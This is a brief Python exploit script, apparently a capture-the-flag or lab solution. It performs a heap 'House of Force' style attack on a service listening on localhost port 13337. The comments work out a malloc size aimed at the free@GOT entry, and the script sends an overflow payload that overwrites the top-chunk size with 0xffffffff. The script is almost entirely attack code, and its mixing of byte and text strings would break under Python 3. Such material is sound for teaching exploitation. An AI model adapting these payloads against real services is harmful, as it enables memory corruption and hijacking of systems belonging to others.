#!/usr/bin/python

import socket
import struct
from termcolor import cprint, colored

print_bold_yellow = lambda x: cprint(x,'yellow',attrs=['bold'])
print_bold_red = lambda x: cprint(x,'red',attrs=['bold'])
#next usable size is 0xFFFFEEFC; but size = ((free-8)-top) = size
# => (free -8) - top = 0xFFFFEEFC + x
# => new in arg must be 0xFFFFEEF4 cause its 8 bit aligned and will be converted to 0xFFFFEEF8
free_got = 0x601018 - 0x8
topchunk = 0x602118 
malloc_size = free_got - topchunk
new_malloc_size = 0xFFFFEEF4
#malloc_size = struct.unpack("<Q",malloc_size)
#print malloc_size
print_bold_yellow("[+] Malloc size is %08X" % (malloc_size & 0xffffffff))
print_bold_red("[+] New alignment to %08X" % (0xFFFFEEF4))

s=socket.create_connection(("127.0.0.1",13337))

arg = b"A"*261 + "\xff\xff\xff\xff" + "\xff\xff\xee\xf4" + b"B"*4
s.sendall(arg)
s.close()

